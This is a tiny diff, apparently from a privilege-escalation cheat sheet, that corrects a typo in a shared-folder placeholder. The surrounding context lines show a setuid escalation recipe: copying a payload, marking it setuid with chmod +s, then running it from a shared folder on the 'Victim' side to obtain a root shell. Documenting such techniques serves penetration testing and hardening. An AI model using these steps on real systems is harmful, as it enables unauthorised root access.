@@ -54,7 +54,7 @@ cp /tmp/payload .
 chmod +s payload
 
 #Victim
-cd <SHAREDD_FOLDER>
+cd <SHARED_FOLDER>
 ./payload #ROOT shell
 ```
 
